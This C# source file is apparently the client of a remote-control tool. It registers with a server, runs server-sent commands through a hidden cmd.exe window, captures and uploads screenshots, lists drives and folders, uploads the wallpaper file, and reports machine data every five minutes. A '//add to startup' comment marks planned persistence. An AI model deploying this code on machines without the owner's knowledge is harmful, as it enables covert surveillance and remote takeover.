using Microsoft.Win32;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.Json;
using NarLib;
using ClientWF.Models;

namespace ClientWF
{
	internal static class Program
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool AllocConsole();



		private static NetworkClient _netClient = new NetworkClient();
		public static DateTime UtcStartTime;

		private static System.Threading.Timer? _updateTimer = null;

		[STAThread]
		static void Main()
		{

			AllocConsole();

			ConfigManager.LoadConfig();

			UtcStartTime = DateTime.UtcNow;
			_netClient.Received += ProcessRequest;

			while (true)
			{
				Setup();

				var status = _netClient.Connect();

				switch (status)
				{
					case RegStatus.Ok:
						Logger.Log("TCP client connected & registred.");
						goto exit_loop;
					case RegStatus.Error:
						Logger.Log("TCP client failed to register due to some problem. Retry in progress...");
						break;
					case RegStatus.WrongCredentails:
						Logger.Log("TCP client failed to register due to wrong credentails. Resetting config...");
						ConfigManager.ResetConfig();
						break;
					case RegStatus.TcpError:
						Logger.Log("TCP client failed to register due to TCP problem. Retry in progress...");
						break;
					default:
						break;
				}
			}
		exit_loop:

			SendWallpaperToServer();

			_updateTimer = new System.Threading.Timer(
				(object? state) => 
				{
					HttpWorker.SendClientData(PcInfoGetter.GetFullData(), true);
				},
				null, 0, 300000); // 5 min


			Console.WriteLine("Started");


			ApplicationConfiguration.Initialize();
			Application.Run(new Form1());
		}


		static public void ProcessRequest(ControlRequestDto request)
		{
			if (request == null)
				return;

			Console.WriteLine("Request");

			switch (request.Type)
			{
				case ControlRequestType.Cmd:
					var result = ExecuteCmd(request.Request);

					SendRequestResult(request.Id, ControlRequestStatus.Succeeded, result, null );

					break;
				case ControlRequestType.InternalFunction:
					var requestString = request.Request.Trim();
					var requestSplitted = requestString.Split(' ');

					var funcExists = Functions.TryGetValue(requestSplitted[0].ToLower(), out var callback);

					if (!funcExists)
					{
						SendRequestResult(request.Id, ControlRequestStatus.Failed, "No such function.", null);
						return;
					}

					callback!(request, requestSplitted.Skip(1).ToArray());


					break;
				case ControlRequestType.Unknown:
				default:
					break;
			}
		}

		static public void SendRequestResult(int reqId, ControlRequestStatus status, string result, string[]? files)
		{
			if (files == null)
				files = new string[0];

			var requestResult = new ControlRequestResult()
			{
				RequestId = reqId,
				Status = status,
				Result = result,
				ClientId = ConfigManager.Config.ClientId,
				ClientSecret = ConfigManager.Config.ClientSecret,
				Files = files
			};

			var json = JsonSerializer.Serialize(requestResult);

			var response = HttpWorker.Post(
				$"http://{ConfigManager.Config.ServerIp}:{ConfigManager.Config.ServerHttpPort}/api/client/commands/response",
				json, "text/json");
		}

		static public void SendWallpaperToServer()
		{
			var wallpaperPath = GetWallpaperPath();

			HttpWorker.UploadFilesToServer(new[] { wallpaperPath }, true);
		}

		static public string ExecuteCmd(string cmdText)
		{
			if (!cmdText.StartsWith("/C"))
				cmdText = $"/C {cmdText}";


			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.RedirectStandardOutput = true;
			startInfo.Arguments = cmdText;
			process.StartInfo = startInfo;

			process.Start();
			var sOut = process.StandardOutput;
			process.WaitForExit();
			return sOut.ReadToEnd();
		}

		static void Setup()
		{
			void failedToRegister()
			{
				Console.WriteLine("Registration failed.");
			}

			if (ConfigManager.Config.IsRegistred)
				return;

			var regResponse = HttpWorker.SendClientData(PcInfoGetter.GetFullData());

			if (regResponse == null)
			{
				failedToRegister();
				return;
			}

			if (regResponse.Status.ToUpper() == "OK")
			{
				ConfigManager.Config.IsRegistred = true;
				ConfigManager.Config.ClientId = regResponse.ClientId;
				ConfigManager.Config.ClientSecret = regResponse.Secret;
				ConfigManager.Config.FirstRegistrationUtcTime = DateTime.UtcNow;

				ConfigManager.SaveConfig();
			}
			else
			{
				failedToRegister();
			}


			//add to startup
		}

		private static string GetWallpaperPath()
		{
			string path = "";

			try
			{
				RegistryKey regKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", false)!;
				if (regKey != null)
				{
					path = regKey.GetValue("WallPaper")!.ToString()!;
					regKey.Close();
				}
			}
			catch 
			{
				path = "";
			}

			return path;
		}

		public static Bitmap GetScreenshotBitmap()
		{
			Rectangle getScreensBounds()
			{
				Rectangle rect = new Rectangle();

				foreach (var item in Screen.AllScreens)
					rect = Rectangle.Union(rect, item.Bounds);

				return rect;
			}

			var bounds = getScreensBounds();
			var bitmap = new Bitmap(bounds.Width, bounds.Height);

			using (var graphics = Graphics.FromImage(bitmap))
			{
				graphics.CopyFromScreen(bounds.Location, Point.Empty, bitmap.Size);
			}

			return bitmap;
		}

		public static string GetDirDataSerialized(string directory = "")
		{
			if (string.IsNullOrEmpty(directory) || directory == "/" || directory == "\\")
			{
				var drives = DriveInfo.GetDrives();

				List<DriveInfoDto> driversDto = new();

				for (int i = 0; i < drives.Length; i++)
				{
					var dto = new DriveInfoDto()
					{
						AvailableFreeSpace = drives[i].AvailableFreeSpace,
						DriveFormat = drives[i].DriveFormat,
						Name = drives[i].Name,
						Directory = drives[i].RootDirectory.FullName,
						TotalFreeSpace = drives[i].TotalFreeSpace,
						TotalSize = drives[i].TotalSize,
						VolumeLabel = drives[i].VolumeLabel
					};

					driversDto.Add(dto);
				}

				var data = new DirDataResponse<DriveInfoDto[]>() { DirDataType = DirDataType.Drives, Response = driversDto.ToArray() };

				return JsonSerializer.Serialize(data);
			}

			if (!Directory.Exists(directory))
			{
				var data = new DirDataResponse<object>() { IsOk = false, ErrMsg = "No such directory", Response = null! };
				return JsonSerializer.Serialize(data);
			}

			var result = new DirDataResponse<List<DirItem>>() { Response = new() };

			var dirs = Directory.GetDirectories(directory);
			var files = Directory.GetFiles(directory);

			result.Response.AddRange(_getDirItemsFromStringArray(dirs, DirItemType.Directory));
			result.Response.AddRange(_getDirItemsFromStringArray(files, DirItemType.File));


			return JsonSerializer.Serialize(result);
		}

		private static List<DirItem> _getDirItemsFromStringArray(string[] items,  DirItemType type)
		{
			var result = new List<DirItem>();

			foreach (var item in items)
			{
				var content = new DirItem()
				{
					FullPath = item,
					Type = type,
					Size = ""
				};

				switch (type)
				{
					case DirItemType.File:
						var fileInfo = new FileInfo(item);

						content.Filename = fileInfo.Name;
						content.Size = Util.GetSizeString(fileInfo.Length);
						content.LocalDateModified = fileInfo.LastWriteTime.ToString("dd.MM.yyyy HH:mm");
						content.LocalDateAccessed = fileInfo.LastAccessTime.ToString("dd.MM.yyyy HH:mm");
						content.LocalDateCreated = fileInfo.CreationTime.ToString("dd.MM.yyyy HH:mm");

						break;
					case DirItemType.Directory:
						var dirInfo = new DirectoryInfo(item);

						content.Filename = dirInfo.Name;
						content.LocalDateModified = dirInfo.LastWriteTime.ToString("dd.MM.yyyy HH:mm");
						content.LocalDateAccessed = dirInfo.LastAccessTime.ToString("dd.MM.yyyy HH:mm");
						content.LocalDateCreated = dirInfo.CreationTime.ToString("dd.MM.yyyy HH:mm");

						break;
					default:
						break;
				}


				result.Add(content);
			}

			return result;
		}



		public static Dictionary<string, Action<ControlRequestDto, IEnumerable<string>>> Functions = new()
		{
			{ 
				"screenshot", 
				(ControlRequestDto request, IEnumerable<string> args) => { 
					var bitmap = GetScreenshotBitmap();

					if(!Directory.Exists("temp"))
						Directory.CreateDirectory("temp");

					var fileName = $"temp/{DateTime.Now.Ticks}-screenshot.png";

					bitmap.Save(fileName);
					var fileNames = HttpWorker.UploadFilesToServer(new [] {fileName});
					File.Delete(fileName);


					SendRequestResult(request.Id, ControlRequestStatus.Succeeded, "View screenshot in attachments.", fileNames.ToArray());
				} 
			},
			{
				"updateclientdata",
				(ControlRequestDto request, IEnumerable<string> args) =>
				{
					HttpWorker.SendClientData(PcInfoGetter.GetFullData(), true);

					SendRequestResult(request.Id, ControlRequestStatus.Succeeded, "Updated data sent.", null);
				}
			},
			{
				"getdirdata",
				(ControlRequestDto request, IEnumerable<string> args) =>
				{
					SendRequestResult(request.Id, ControlRequestStatus.Succeeded, GetDirDataSerialized(String.Join(" ", args)), null);
				}
			}
		};
	}
}